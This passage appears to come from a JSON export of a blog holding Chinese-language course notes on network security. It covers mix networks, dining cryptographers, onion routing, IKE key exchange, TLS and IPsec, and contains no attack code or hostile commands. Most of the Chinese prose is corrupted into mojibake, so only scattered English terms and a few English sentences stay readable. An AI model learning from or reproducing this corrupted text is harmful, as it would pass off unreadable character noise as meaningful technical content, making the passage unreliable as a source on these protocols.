ç½‘ç»œæµé‡ä¸­çš„dummy messageä»è€Œä¸floodingæ•°æ®åŒ…è¿›è¡ŒæŠ—è¡¡ï¼Œå¢åŠ åŒ¿åæ€§   Mix networks: advantages  åŒ¿ååŒ–çš„ç¨‹åº¦éå¸¸é«˜  Mix input and output ä¹‹é—´æ— æ³•è¢«è”ç³»èµ·æ¥  åªè¦æœ‰ä¸€ä¸ªMix serveræ²¡æœ‰è¢«å…¥ä¾µå°±è¿˜èƒ½ä¿è¯åŒ¿åæ€§  åªè¦æœ‰è¶³å¤Ÿå¤šçš„dummy traffic, anonymity setå°±æ˜¯æ•´ä¸€ä¸ªç½‘ç»œ    æ–°çš„å¯†ç å­¦çš„å®è·µ  è¿receiveréƒ½å¯ä»¥ä¸çŸ¥é“senderæ˜¯è°  åŒæ—¶è¿™å°åŒ¿åçš„é‚®ä»¶æ˜¯å¯ä»¥è¢«certifiedçš„ï¼Œå¯ä»¥ç”±receiverä»¥åŠè·¯ä¸Šçš„æ¯ä¸€ä¸ªMixè¿›è¡Œç­¾å     Mix networks: disadvantages  çº§è”çš„ Mix serveræ„å‘³ç€æ¯ä¸€ä¸ªserverä¸Šéƒ½è¦è¿›è¡Œå¤§é‡çš„åŠ å¯†è§£å¯†ç»“ç®—ï¼Œéå¸¸æ¶ˆè€—èµ„æº  å»¶è¿Ÿéå¸¸é«˜ï¼Œemailè¿˜å¯ä»¥æ¥å—ï¼Œä½†æ˜¯ç½‘é¡µæµè§ˆå°±æ²¡åŠæ³•äº†  Dummy messageçš„å¼€é”€å¾ˆå¤§  å¦‚ä½•æ­å»ºä¸€ä¸ªä½å»¶è¿Ÿçš„åŒ¿åç¯å¢ƒæ˜¯ä¸€ä¸ªæŒ‘æˆ˜  Use public-key cryptography to establish a â€œcircuitâ€ with pairwise symmetric keys between hops on the circuit.  Then use symmetric decryption and re-encryption to move data messages along the established circuits.  Each node behaves like a mix; anonymity is preserved even if some nodes are compromised     Dining cryptographers ä¸‰ä¸ªçš„å¯†ç å­¦å®¶åœ¨ä¸€èµ·åƒæ™šé¥­ï¼Œåƒå®Œé¥­ä¹‹åéœ€è¦ç»“è´¦ï¼Œä»–ä»¬æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€æ˜¯æŠ¥é”€è®©NSAä»˜é’±ï¼Œè¦ä¹ˆä»–ä»¬ä¸­çš„ä¸€ä¸ªä»˜é’±ï¼Œä½†æ˜¯ä»˜é’±çš„é‚£ä¸ªäººä¸å¸Œæœ›å…¶ä»–ä¸¤ä¸ªäººçŸ¥é“ï¼ˆåˆ«é—®ä¸‡ä¸€ä¸¤ä¸ªäººéƒ½æƒ³ä»˜é’±æ€ä¹ˆåŠ233ï¼‰ï¼Œä»–ä»¬ç›¸å‡ºäº†ä¸€ä¸ªåŠæ³•å¯ä»¥è®©è¿™ä¸€åˆ‡æˆç«‹  æ¯ä¸ªå¯†ç å­¦å®¶éƒ½æŠ›ä¸€æšç¡¬å¸ï¼Œå¹¶å‘å…¶å·¦è¾¹çš„é‚»å±…å±•ç¤º  å› æ­¤æ¯ä¸ªå¯†ç å­¦éƒ½èƒ½çœ‹åˆ°ä¸¤æšç¡¬å¸ï¼Œä»–è‡ªå·±çš„å’Œä»–å³è¾¹çš„é‚»å±…çš„    æ¯ä¸ªå¯†ç å­¦å®¶éœ€è¦å®£ç§°ä¸¤æšç¡¬å¸æ˜¯å¦ç›¸åŒ  ä»˜é’±çš„é‚£ä½å¯†ç å­¦å®¶ä¼šæ’’è°ï¼ˆè¯´åè¯ï¼‰    é‚£ä¹ˆå¦‚æœè¯´â€œç›¸åŒçš„â€æ˜¯å•æ•° =\u0026gt; NSAæŠ¥é”€  å¦‚æœæ˜¯å¶æ•°ï¼Œä»–ä»¬å…¶ä¸­ä¸€ä¸ªäººä»˜é’±äº†  ä½†æ˜¯å…¶ä»–äººä¸çŸ¥é“è°ä»˜é’±äº†     Three-person DC protocol  å‡è®¾ä¸‰ä½å¯†ç å­¦å®¶ï¼šC1, C2, C3æŠ•æ·äº†ç¡¬å¸ï¼Œå…¶ç»“æœä¸ºbi  æ¯ä½å¯†ç å­¦å®¶éƒ½ä¸å·¦è¾¹çš„é‚»å±…å…±äº«äº†è‡ªå·±çš„ä¿¡æ¯  æ¯ä½å¯†ç å­¦å®¶éƒ½å°†è‡ªå·±æ‰€çœ‹åˆ°çš„ä¸¤æšç¡¬å¸çš„æƒ…å†µè¿›è¡Œè®¡ç®—di = bi XOR bi-1  biè¡¨ç¤ºå¯†ç å­¦å®¶è‡ªå·±çš„ç¡¬å¸  bi-1è¡¨ç¤ºå³è¾¹é‚»å±…çš„æƒ…å†µ  è¦æ³¨æ„çš„æ˜¯d0 = d3 and b0 = b3å› ä¸ºç»•äº†ä¸€åœˆäº†    å¦‚æœæ²¡æœ‰ä»˜é’±ï¼Œé‚£å°±ç›´æ¥å®£ç§°è®¡ç®—çš„ç»“æœdi,å¦‚æœä»˜é’±äº†ï¼Œé‚£å°±å®£ç§°di XOR 1   Proof æˆ‘ä»¬å‡è®¾æœ‰ä¸‰ä½å¯†ç å­¦å®¶æ‰€å®£ç§°çš„å€¼ä¸ºï¼šA1, A2, A3   å¦‚æœæ²¡ä»˜é’±äº†ï¼Œé‚£ä¹ˆAi = di   å¦‚æœä»˜é’±ï¼Œ Ai = di XOR 1    å¦‚æœæ²¡æœ‰ä¸€ä¸ªäººä»˜é’±ï¼Œé‚£ä¹ˆæ‰€æœ‰å®£ç§°çš„æ•°å€¼è®¡ç®—ååº”è¯¥å¾—å‡º0ï¼Œå¦åˆ™åˆ™ä¸º1  åŒæ—¶ï¼Œå¦‚æœæœ‰äººä»˜é’±äº†ï¼Œä¸€ä¸ªæ²¡æœ‰ä»˜é’±çš„å¯†ç å­¦å®¶æ˜¯æ— æ³•å¾—çŸ¥æ˜¯å…¶ä»–ä¸¤äººä¸­çš„è°ä»˜çš„ åŒæ ·çš„æƒ…å†µå¯ä»¥è¿ç”¨åˆ°å¤šä¸ªç”¨æˆ·èº«ä¸Šï¼Œæ¯ä¸ªç”¨æˆ·éƒ½ç”Ÿæˆä¸€ä¸ªéšæœºçš„bitå‘é€ç»™å·¦è¾¹çš„é‚»å±…ï¼Œæ¯ä¸ªäººéƒ½æœ‰ä¸¤ä¸ªbitsæ¥è¿›è¡Œè®¡ç®—  æ¯ä¸ªäººéƒ½å®£ç§°è‡ªå·±è¿›è¡ŒXORè®¡ç®—çš„ç»“æœ  åªæœ‰å‘é€è€…ä¼šå¤šXORä¸€ä¸ªæƒ³è¦å‘é€çš„æ•°æ®ä¸­çš„bit  è¿™æ ·å°±å¯ä»¥ç»¼åˆæ‰€æœ‰çš„ç»“æœå¹¶å¾—åˆ°0/1ä¹Ÿå°±æ˜¯message bit   ä½†æ˜¯ç°å®ä¸­å¾ˆéš¾å®ç°ï¼Œå› ä¸ºé¦–å…ˆéœ€è¦å¾ˆå¤§çš„åŒ¿åç»„ï¼Œç„¶åè¿˜æœ‰æ¯ä¸ªç”¨æˆ·éƒ½åšéšæœºæ•°ç„¶åå†è®¡ç®—ï¼Œå¾ˆå¤æ‚ å®‰å…¨æ€§ç¡®å®å¾ˆå¼ºï¼Œå°±ç®—æœ‰å¾ˆå¼ºå¤§çš„ç®—åŠ›ä¹Ÿæ— æ³•å¾—çŸ¥å‘é€è€…æ˜¯è°ã€‚ åŒæ—¶ä¹Ÿä¼šå› ä¸ºé€šä¿¡channelè¢«å¹²æ‰°è€Œå‡ºç°é”™è¯¯ï¼ŒåŒæ—¶åŒ¿åç»„ä¸­çš„æˆå‘˜å¦‚æœæ’’è°äº†ä¹Ÿä¼šå¯¼è‡´é€šä¿¡å¤±è´¥ Onion routing å‘é€è€…éšæœºåœ°é€‰æ‹©é€”å¾„è·¯ç”±å™¨çš„æ¬¡åº  æˆ‘ä»¬å‡è®¾æœ‰ä¸€äº›è·¯ç”±å™¨æ˜¯è¯šå®çš„ï¼Œä½†æ˜¯æœ‰ä¸€äº›è¢«é»‘å®¢æ‰€æ§åˆ¶äº†  å‘é€è€…ä¸»åŠ¨çš„æ§åˆ¶è·¯å¾„çš„é•¿åº¦     å‘é€è€…å°†æ•°æ®æ ¹æ®é€‰æ‹©çš„è·¯å¾„ç”¨æ¯ä¸ªè·¯ç”±å™¨çš„public keyåŠ å¯†å¥½ï¼Œå¹¶å†…ç½®ä¸€ä¸ªsymmetric keyæ¥å¯¹åç»­çš„å†…å®¹è¿›è¡ŒåŠ å¯†  åŒæ—¶æ¯ä¸ªè·¯ç”±å™¨åªèƒ½è·å–åˆ°å‰ä¸€ä¸ªrouterçš„identity,ä½¿å…¶æ— æ³•æº¯æº   Tor (the onion router)å°±æ˜¯è¿™ä¹ˆè¿›è¡ŒåŒ¿åé€šä¿¡çš„ Set up Onion service sot that it\u0026rsquo;s reachable by clients  å‘é€è€…é¦–å…ˆå…ˆä¸ä¸€å°è·¯ç”±å™¨äº¤æ¢symmetric session key  ç„¶åç”¨è¿™å°è·¯ç”±å™¨ä½œä¸ºä»£ç†ä¸æ–°çš„è·¯ç”±å™¨äº¤æ¢symmetric session keyï¼Œä¸æ–­åå¤ï¼Œç›´åˆ°åˆ°è¾¾ç›®æ ‡åœ°å€  ç„¶åå°±åˆ©ç”¨å»ºç«‹çš„Tor circuitè¿›è¡Œé€šä¿¡ï¼Œæ¯ä¸ªé€”å¾„çš„onion routeréƒ½ä¼šå•ç‹¬åŠ å¯†è§£å¯†   Location hidden servers Goal:  å°†æœåŠ¡å™¨éƒ¨ç½²åœ¨Internetä¸Šå¹¶ä¸”å‘ŠçŸ¥å…¶ä»–ç”¨æˆ·å¯ä»¥è®¿é—®ï¼Œä½†æ˜¯ä¸èƒ½è®©åˆ«äººçŸ¥é“è¿™å°æœåŠ¡å™¨åœ¨å“ªå„¿å’Œæ˜¯è°åœ¨è¿è¡Œ  éšå¤„å¯ä»¥è®¿é—®  ä¸ä¼šè¢«å®¡æŸ¥  èƒ½å¤Ÿåœ¨DoS attackä¸­å­˜æ´»  æ‰¾ä¸åˆ°ç‰©ç†æœåŠ¡å™¨   https://community.torproject.org/onion-services/overview/ Privacy A privacy policy specifies how data may be used, under which condition, and what obligations this entails. ","date":"2022-05-30T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_10_privacy_and_anonymity/","title":"NSE Week 10: Privacy and anonymity"},{"content":"NSE Week 9: IKE and SSL/TLS IKE (The Internet Key Exchange protocol) IKEä¸ä»…ä»…åªæ˜¯å…³äºå¯†é’¥ï¼Œæ›´å¤šçš„å…³äºSA (security associations):  åè®®çš„æ ¼å¼  åŠ å¯†æˆ–è€…å“ˆå¸Œçš„ç®—æ³•  å¯†é’¥   IKEååˆ†çš„çµæ´»ï¼Œæ¯”å¦‚æä¾›èº«ä»½è®¤è¯ï¼Œå¹¶é€šè¿‡å¤šç§pre-shared secretsæ¥å®ç° IKEåˆååˆ†å¤æ‚ï¼Œæœ‰å¾ˆå¤šçš„é€‰é¡¹å¯ä»¥é…ç½®ä»¥åŠå¾ˆå¤šçš„å­åè®® IKEç»“åˆäº† ISAKMP çš„æ•°æ®åŒ…æ ¼å¼ï¼Œä»¥åŠ OAKLEY çš„åè®®ï¼Œè¿™ä¸¤ä¸ªä¸œè¥¿éƒ½åŸºäº Diffie-hellman protocol  PFS å¦‚æœæˆ‘ä»¬å·²ç»èƒ½å®‰å…¨çš„äº¤æ¢YA,YBäº†ï¼Œä¸ºä»€ä¹ˆè¿˜è¦å¥—åœ¨è¿™ä¸ªDiffie-Hellmané‡Œé¢ç”¨å‘¢ï¼Ÿ ä¸»è¦æ˜¯ä¸ºäº†å®ç°PFSï¼Œperfect forward secrecy  PFS,perfect forward secrecy  ä¸ºäº†ç¡®ä¿åè®®åšç”Ÿæˆçš„ä¸´æ—¶keyï¼Œsession keyä¸ä¼šå› ä¸ºç”¨æ¥äº§ç”Ÿè¿™ä¸ªsession keyæ‰€ç”¨åˆ°çš„keyè¢«ç ´è§£äº†è€Œå¯¼è‡´session keyä¹Ÿæ²¡ç ´æˆ’  ç”¨æ¥åŠ å¯†ä¼ è¾“æ•°æ®çš„keyä¸èƒ½ç”¨ä½œäº§ç”Ÿå…¶ä»–çš„keyï¼Œè¿™æ ·å°±ä¼šäº§ç”Ÿè¿å¸¦æ•ˆåº”ï¼Œä¸€ä¸ªkeyè¢«ç ´è§£äº†ï¼Œå…¶æ‰€äº§ç”Ÿçš„keyä¹Ÿä¼šè¢«ç ´è§£  åŒæ ·çš„é“ç†ï¼Œå¦‚æœäº§ç”Ÿå½“å‰çš„keyéœ€è¦é€šè¿‡å…¶ä»–keysæ¥äº§ç”Ÿï¼Œé‚£ä¹ˆé‚£äº›keyä¹Ÿä¸èƒ½ç”¨åšå…¶ä»–keyçš„äº§ç”Ÿ  ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªkeyè¢«ç ´è§£äº†ï¼Œåªä¼šå½±å“ç”¨å…¶æ‰€åŠ å¯†çš„æ•°æ®ï¼Œå…¶ä»–éƒ½ä¸ä¼šæ”¶åˆ°å½±å“     å› æ­¤åœ¨å…·ä½“å®ç°çš„æ—¶å€™çš„ä¸€ä¸ªå°æŠ€å·§å°±æ˜¯ï¼Œæ¯ä¸ªsession keyéƒ½æ˜¯éšæœºäº§ç”Ÿçš„ï¼Œå¹¶ä¸”åœ¨sessionç»“æŸä¹‹åå°±é”€æ¯ï¼Œè¿™æ ·å°±éƒ½ä¸ä¼šå½±å“äº†ï¼ŒåŒæ—¶ä¹Ÿä¼šç»™å¯†ç åˆ†æå¸¦æ¥è´Ÿæ‹…ã€‚ IKE protocol IKEå¯ä»¥ä¸ºé€šä¿¡çš„åŒæ–¹æ¥å»ºç«‹å’Œç»´æŠ¤SA Typical key establishment protocol: åªæœ‰ä¸€ä¸ªé˜¶æ®µï¼Œå°±æ˜¯åŒæ–¹ä½¿ç”¨ master keys æ¥è¿›è¡Œé€šä¿¡äº¤æ¢ä¿¡æ¯  Master keys  pre-shared secret (symmetric) keys  public encryption key (used only for encryption/decryption), æ¯”å¦‚äº’ç›¸çŸ¥é“å¯¹æ–¹çš„public keyï¼Œç„¶ååŠ å¯†ä¹‹åå¯ä»¥ç”±å¯¹æ–¹çš„private keyæ¥è¿›è¡Œè§£å¯†  public signature key ï¼ˆç”¨æ¥è¿›è¡ŒéªŒè¯ï¼‰     IKEåˆ™æœ‰ä¸¤ä¸ªæ­¥éª¤ï¼š  Phase 1: é€šä¿¡çš„åŒæ–¹çº¿åå•†ä¸€ä¸ªSAï¼Œå…³äºä½¿ç”¨ä»€ä¹ˆåŠ å¯†æˆ–è€…å“ˆå¸Œç®—æ³•  Phase 2: Phase 1ä¸­äº§ç”Ÿçš„SAä¼šç»§ç»­äº§ç”Ÿ \u0026ldquo;child SAs\u0026quot;æ¥è¿›è¡ŒåŠ å¯†å’ŒéªŒè¯æœªæ¥çš„é€šä¿¡   IKE phase 1 IKEçš„ç¬¬ä¸€ä¸ªé˜¶æ®µä¸»è¦çš„ç›®çš„æ˜¯è¦å»ºç«‹ä¸€ä¸ªå®‰å…¨çš„channelæ¥ç»™Phase 2è¿›è¡Œé€šä¿¡äº¤æµ éœ€è¦ç”¨åˆ°çš„æ¦‚å¿µæœ‰ï¼š  Cookiesï¼šç”¨ä½œåˆæœŸçš„èº«ä»½è®¤è¯ï¼Œæ¨èçš„å®ç°æ–¹æ³•æ˜¯ï¼š  é€šè¿‡ä¸€äº›è¾ƒå¿«çš„hashï¼Œä¾‹å¦‚MD5ï¼Œå°†UDPçš„IP source/destination address/ports ä»¥åŠä¿å­˜åœ¨æœ¬åœ°çš„ä¸€ä¸ª secret value è¿›è¡Œhash  å› ä¸ºå­˜åœ¨ä¸€ä¸ª secret value ï¼Œé‚£ä¹ˆé€šè¿‡å°†è‡ªå·±ç”Ÿæˆçš„cookieå‘é€ç»™å¯¹æ–¹ï¼Œå†ç”±å¯¹æ–¹å‘é€å›æ¥ï¼Œå°±å¯ä»¥è¿›è¡ŒéªŒè¯ï¼Œæ˜¯å¦æ˜¯è‡ªå·±æ›¾ç»å‘å‡ºçš„å†…å®¹    Identifiers, ID: ç”¨æ¥æ ‡è¯†é€šä¿¡çš„åŒæ–¹çš„èº«ä»½ï¼Œå¯ä»¥æ˜¯ï¼š  IP address  Fully-qualified domain name  Certification  E-mail address  MAC address    Authenticators: ç”¨äºéªŒè¯æ¶ˆæ¯çš„æ•°æ®   IKE Phase 1 æä¾›ä¸¤ç§æ¨¡å¼  Main mode  é€šè¿‡6æ¡äº¤æ¢çš„ä¿¡æ¯æ¥å»ºç«‹ Initiator(I) and Responder(R) ä¹‹é—´çš„å®‰å…¨channel  é€šè¿‡äº’ç›¸çš„é…ç½®åå•†æ¥å®ç°  Identify protection  Considerable flexibility      Aggressive mode  ç”±äºä¸æä¾›ä¿æŠ¤å› æ­¤èƒ½å¤Ÿæ›´å¿«çš„å»ºç«‹  åªéœ€è¦3æ¡ä¿¡æ¯çš„äº¤æ¢  æ²¡æœ‰ æä¾› Identify protection åªæœ‰public-keyåŠ å¯†æ‰€å¸¦æ¥çš„authentication     æ ¹æ®é€‰ç”¨çš„ authentication æ–¹æ³•çš„ä¸åŒï¼Œæ¯ç§æ¨¡å¼éƒ½æ‹¥æœ‰4ç§å˜åŒ–  Pre-shared key  Digital signatures  2 public-key variants   æˆ‘ä»¬çš„é‡ç‚¹ä¼šæ”¾åœ¨Main modeä¸Š   Iä¼šç”ŸæˆCookie_I ä»¥åŠISA_I (ISAKMP SA)å…¶ä¸­åŒ…å«äº†æå‡ºçš„æè®®ï¼ˆåŠ å¯†å’Œå“ˆå¸Œç®—æ³•ï¼‰  Råœ¨æ”¶åˆ°ä¹‹åï¼Œä¼šè€ƒè™‘Iæå‡ºçš„proposalç„¶åé€‰æ‹©ä½¿ç”¨ä»€ä¹ˆç®—æ³•ï¼šISA_R,æ¥ç€è¿”å›è‡ªå·±ç”Ÿæˆçš„Cookie   ä»¥ä¸‹å°±æ˜¯ä¸€ä¸ªä¾‹å­ï¼ŒIä¼šæå‡ºå»ºè®®ï¼Œç„¶åç”±Ræ¥é€‰æ‹©ï¼Œå› æ­¤ISA_I \u0026amp; ISA_Rå¯èƒ½ç›¸åŒä¹Ÿå¯èƒ½ä¸åŒï¼Œè¿™å°†æœ‰Ræ¥å†³å®š   Iæ”¶åˆ°RåŒæ„çš„æ¡çº¦ä¹‹åï¼Œéšæœºé€‰æ‹©æ„å»ºDHæ‰€éœ€è¦çš„å‚æ•° g, p (g is the primitive root of p),  X = g^x mod p  æ¥ç€é™„ä¸Šä¸€ä¸ªnonceï¼Œç”¨æ¥é˜²æ­¢relay attackï¼Œkeep freshness    Ræ”¶åˆ°Iå‘æ¥çš„cookieä¹‹åï¼Œå…ˆå¯¹è‡ªå·±çš„C_Rè¿›è¡Œé‡æ–°è®¡ç®—å¹¶éªŒè¯  æ¥ç€è®¡ç®—Y = g^y mod p  æœ€åç”Ÿæˆè‡ªå·±nonce N_R è¿”å›ç»™I    Iæ”¶åˆ°Rçš„Yä¹‹åï¼Œå°±å¯ä»¥ç”¨æ¥è®¡ç®— DH session keyäº†ï¼Œåœ¨æ­¤ä¹‹å‰è¿˜ä¼šé‡æ–°è®¡ç®—å¹¶éªŒè¯è‡ªå·±çš„cookie C_I  æ¥ç€ä¼šå°†è‡ªå·±çš„IDä»¥åŠ previous dataé€šè¿‡çº¦å®šå¥½çš„ authenticator è®¡ç®—å¥½å¹¶å’ŒIDä¸€èµ·ç”¨DH session keyè¿›è¡ŒåŠ å¯†å¹¶è¿”å›ç»™R    RéªŒè¯äº†è‡ªå·±çš„Cookie C_R ä¹‹åä¹Ÿä¼šå°†è‡ªå·±çš„ID_Rä»¥åŠauthentication dataç”¨DH session keyè¿›è¡ŒåŠ å¯†åè¿”å›ç»™Iï¼ŒIéªŒè¯äº†Rçš„IDä¹‹åä¹Ÿå°±å®Œæˆäº†phase1   æ ¹æ®ä¸åŒçš„authenticatorä¹Ÿä¼šæœ‰ä¸€äº›å˜ç§ï¼Œä½†æ˜¯æ­¥éª¤æ˜¯ä¸å˜çš„  IKE phase 2 IKE phase 2çš„é€šä¿¡ä¼šç”±ä¹‹å‰åœ¨phase 1ä¸­è¾¾æˆçš„SAè¿›è¡Œä¿æŠ¤ IKE phase 2çš„ç›®çš„å°±æ˜¯åˆ©ç”¨ä¹‹å‰å»ºç«‹çš„å®‰å…¨çš„é€šä¿¡ï¼Œå¼€å§‹äº¤æ¢åå•†çœŸæ­£éœ€è¦ç”¨åœ¨é€šä¿¡ä¸­çš„SAs phase 2ä¹Ÿæœ‰ä¸¤ç§mode  Quick mode  ç›´æ¥åˆ›é€ æ–°çš„SAs (e.g., for ESP or AH)    New group mode  ç”¨æ¥ä¿®æ”¹å­˜åœ¨çš„SAsçš„å‚æ•°  ä¸äº§ç”Ÿæ–°çš„SAs     æˆ‘ä»¬ä¸»è¦å…³æ³¨Quick mode å¦‚æœè¢«è¦æ±‚å®ç°PFSï¼Œé‚£ä¹ˆquick modeä¹Ÿä¼šå†æ¬¡å®ç°DH exchange å¤šä¸ªquick modeå¯ä»¥ç”¨ä¸è¿›è¡Œï¼Œå¹¶ä¸”ä¼šä½¿ç”¨åœ¨phase1ä¸­ç”¨åˆ°è¿‡çš„ID æ•°æ®çš„åŠ å¯†ä¼šç”¨åˆ°phase 1ä¸­çš„æ•°æ®ï¼Œç”¨åœ¨phase 2ä¸­çš„æ–°key    SPIå°±æ˜¯ç”¨æ¥æ ‡è¯†æ–°çš„SAçš„ SPI fields   kå°±æ˜¯DH exchangeæ‰€ç”Ÿæˆçš„session key   åå•†å»ºç«‹ä¸€ä¸ªSA   ç”ŸæˆIPsec key ç”¨ä½œå°†æ¥ESP or AH ä¸­    æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªåå•†çš„è¿‡ç¨‹ï¼Œå°±æ˜¯Iå‘èµ·å€¡è®®ï¼Œç„¶åè¿˜æ˜¯ç”±Ræ¥å†³å®šæœ€ç»ˆçš„SAæ˜¯æ€ä¹ˆæ ·çš„ å¦ä¸€ä¸ªä¾‹å­  The second phase of the IKE protocol is done by three message exchanges. For the ï¬rst and second messages I1 and R1, the initiator I and the responder R exchange IPSec SAs (IP SecSAIand IP SecSAR),nonces NI and NR(for replay attack protection), optional D -H values gI and gR, and hashes of these values and message IDs (to prove liveliness), HashI1 and HashR1. After the initiator sends one more hash (HashI2) using both NI and NR and the message ID as the third message, both parties will agree on the IPSec symmetric key for use during ESP or AH encapsulation. ä¸ºäº†æ›´å¥½çš„ä¿æŠ¤é•¿ä¹…çš„VPN session, IPsec æä¾›äº†å®šæœŸåˆ·æ–°IKE keyä»¥åŠIPSec keysçš„æœºåˆ¶  IKE keyçš„åˆ·æ–°éœ€è¦é‡æ–°è·‘ä¸¤ä¸ªphase  ä½†æ˜¯åˆ·æ–°IPsecåªéœ€è¦è·‘phase 2å³å¯   SSL/TLS SSL/TLSæ˜¯ç”¨æ¥ä¿æŠ¤Transport layerä¼ è¾“å±‚çš„å®‰å…¨çš„ï¼Œé€šè¿‡æä¾›confidentiality and integrityæ¥é˜²æ­¢é€šä¿¡è¢«çªƒå¬å’Œç¯¡æ”¹ ç›®æ ‡æ˜¯å®ç°Confidentiality, integrityï¼Œæœ‰æ¡ä»¶çš„è¯ä¹Ÿå¯ä»¥å®ç°authenticationï¼Œé€šè¿‡å•ï¼ˆåŒï¼‰å‘çš„è®¤è¯channelæ¥è¿›è¡Œå®‰å…¨çš„é€šä¿¡ï¼Œç”±public-key certificateæ‰€æ”¯æŒï¼Œå› ä¸ºæ˜¯Transport layerä¸Šçš„å®‰å…¨ï¼Œå› æ­¤ä¹Ÿå¯ä»¥è¢«åº”ç”¨å±‚çš„åè®®æ‰€åˆ©ç”¨ï¼Œä¾‹å¦‚HTTP(S), SMTP, IMAP SSL/TLSå®ç°äº†ä¸¤ç§åè®® TLS Handshake protocol TLS Handshake protocol é€šè¿‡åˆå§‹åŒ–æˆ–è€…æ¢å¤ä¹‹å‰çš„connectionç„¶åæ­å»ºä¸€ä¸ªå®‰å…¨çš„channelæ¥è¿›è¡Œé€šä¿¡   Server certificate: B -\u0026gt; A: certificate(B, K_B)   Certificateæ˜¯ç”± trusted third party æ¥è¿›è¡Œè®¤è¯çš„ï¼ŒåŒ…å«äº†Bçš„identityä»¥åŠBçš„public key  client exchange  client certificate (option) A -\u0026gt; B: certificate (A, K_A) {PMS}_K_B  client key exchange A - \u0026gt; B: {PMS}_K_B  certificate verify (option) A-\u0026gt; B:{hash(message)}{K_A}^-1     PMS: pre-master secretæ˜¯ç”¨æ¥ç”Ÿæˆæ–°çš„master key Mçš„ï¼ŒM= PRF(PMS, Na, Nb), where PRF is pseudo-random function Nonceä¿¡æ¯å¯ä»¥æ˜¯åœ¨helloä¿¡æ¯ä¸­è¢«ç¡®å®šçš„ æœ€é‡è¦çš„å°±æ˜¯ä¸¤æ¡æ¶ˆæ¯å°±æ˜¯  Server certificate: B -\u0026gt; A: certificate(B, K_B)  client key exchange A - \u0026gt; B: {PMS}_K_B   simplest SSL do not provide authentication of senderâ€™s identity (it has options to prove) TLS Record Protocol TLS Record protocolæ˜¯ç”¨æ¥é€šä¿¡äº¤æ¢æ•°æ®çš„ï¼Œä¸»è¦æè¿°äº†åº”ç”¨å±‚å‘å‡ºçš„æ•°æ®åº”è¯¥å¦‚ä½•è¢«å‹ç¼©ï¼Œç”¨MACè¿›è¡Œè®¤è¯ä»¥åŠpayloadè¦å¦‚ä½•åŠ å¯† TLS Record Protocol ä¸ºæ¯ä¸€ä¸ªTLS connectionsæä¾›äº†ä¸¤ç§æœåŠ¡  Confidentiality  ç”±TLS Handshake protocol æ‰€å®šä¹‰çš„å¯†é’¥å¯ä»¥ç”¨æ¥å¯¹TLS payload è¿›è¡ŒåŠ å¯†    Message Integrity  ç”±TLS Handshake protocol æ‰€å®šä¹‰çš„å…±äº«å¯†é’¥ï¼ˆpublic keyï¼‰å¯ä»¥ç”¨æ¥ç»„æˆMAC (message authentication code)æ¥éªŒè¯integrity      TLS connection and TLS session  TLS connection  æ˜¯ä¸€ä¸ªçŸ­æ—¶é—´çš„æ¦‚å¿µtransient  æ¯ä¸€ä¸ªconnectionä¼šå…³è”ä¸€ä¸ªTLS session TLSä¼šè¯  connectionæ˜¯P2Pçš„å…³ç³»  TLS connection æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªsessionå†…çš„å®‰å…¨æµ a secure stream within a session    TLS session  TLS sessionæ˜¯ä¸€ä¸ªé•¿æ—¶é—´çš„æ¦‚å¿µï¼Œå°±ç®—connectionä¸­æ–­äº†ï¼Œä½†æ˜¯sessionä¾ç„¶å­˜åœ¨  å…¶è¡¨ç¤ºclient and serverä¹‹é—´è¿›è¡Œå®‰å…¨é€šä¿¡çš„å…³ç³»ï¼Œåè®®ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼Security associationçš„ä¸œè¥¿  TLS session ç”±TLS Handshake Protocolæ‰€åˆ›é€ ï¼Œç”±client and securityåŒå‘åå•†è¾¾æˆå…±è¯†  æ¯ä¸€ä¸ªTLS sessionä¸­éƒ½æœ‰å¾ˆå¤šå…³äºå®‰å…¨çš„å‚æ•°ï¼Œå¯ä»¥åŒæ—¶è¢«å¾ˆå¤šconnectionå…±äº«     ","date":"2022-05-30T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week_9_ike_and_ssl_tls/","title":"NSE Week 9: IKE and SSL/TLS"},{"content":"NSE Week 8: IP security Internet security Why we need IP security, what the problems in existing TCP/IP protocols? ä»–ä»¬æ²¡æœ‰æä¾›authenticationæˆ–è€…confidentialityçš„åŠŸèƒ½ï¼Œå› æ­¤é»‘å®¢å¯ä»¥sniffingä¹Ÿå¯ä»¥spoofing IPsec IP security (IPsec)é€šè¿‡æä¾›é¢å¤–çš„IP headeræ¥å¢å¼ºå®‰å…¨ï¼Œé€‚ç”¨äºIPv4 or IPv6 é€šè¿‡åœ¨IPå±‚å®ç°è¿™ä¸ªå®‰å…¨æªæ–½ï¼Œå¯ä»¥æ—¢ä¿æŠ¤é‚£äº›å·²ç»åœ¨åº”ç”¨å±‚åšäº†å®‰å…¨æªæ–½çš„åº”ç”¨ï¼ˆä¾‹å¦‚çœ‹å…¨é‚®ä»¶ç³»ç»Ÿï¼ŒSSLï¼ŒKerberosï¼‰ï¼Œä¹Ÿå¯ä»¥å¸®åŠ©é‚£äº›æ²¡æœ‰å®‰å…¨æªæ–½çš„åº”ç”¨è¿›è¡Œé˜²æŠ¤ã€‚ IPsecæä¾›äº†ä¸‰ç§å®‰å…¨åŠŸèƒ½ï¼š  Authentication: é€šè¿‡ä¿è¯é€šä¿¡çš„åŒæ–¹çš„èº«ä»½éƒ½ç»è¿‡äº†è®¤è¯  Confidentiality: é€šè¿‡å¯¹payloadæ•°æ®çš„åŠ å¯†æ¥é˜²èŒƒæœªç»æˆæƒçš„æŸ¥çœ‹  Key management: å®‰å…¨çš„keysäº¤æ¢   Implementation  Operating systems: å¯¹ä¸»æœºç»ˆç«¯ç”¨æˆ·æä¾›ä¿æŠ¤  Security gateways: firewalls or routers, æ¯”å¦‚å®ç°VPN   Application åº”ç”¨  ä¿æŠ¤åˆ†å…¬å¸å†…éƒ¨ä¹‹é—´çš„é€šä¿¡ï¼šå…¬å¸å¯ä»¥åœ¨LANæˆ–è€…WANæ­å»ºVPNæ¥å‡å°‘å¯¹äºprivate networksçš„ä¾èµ–  